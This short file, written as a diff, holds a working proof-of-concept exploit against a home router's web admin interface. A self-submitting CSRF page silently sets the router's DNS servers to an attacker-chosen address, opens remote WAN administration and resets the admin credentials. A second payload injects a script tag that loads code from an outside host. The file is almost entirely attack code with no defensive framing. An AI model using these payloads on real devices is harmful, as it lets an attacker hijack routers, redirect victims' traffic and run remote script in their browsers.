@@ -1,0 +1,26 @@
+CSRF: 
+
+ <html>
+   <body onload="document.wan.submit(); document.password.submit()">
+   <form action="http://192.168.1.254/goform/formWanTcpipSetup"
+    method="post" name="wan">
+   <input type="hidden" value="dnsManual" name="dnsMode" checked>
+   <input type="hidden" name="dns1" value="216.239.32.10">
+   <input type="hidden" name="dns2" value="216.239.32.10">
+   <input type="hidden" name="dns3" value="216.239.32.10">
+   <input type="hidden" name="webWanAccess" value="ON"
+    checked="checked">
+   </form>
+   <form action="http://192.168.1.254/goform/formPasswordSetup"
+    method="post" name="password">
+   <input type="hidden" name="username" value="mallory">
+   <input type="hidden" name="newpass" value="gotroot">
+   <input type="hidden" name="confpass" value="gotroot">
+   </form>
+   </body>
+   </html>
+
+HTML-injection: 
+
+""><script src="http://l7.fi"></script><p
+
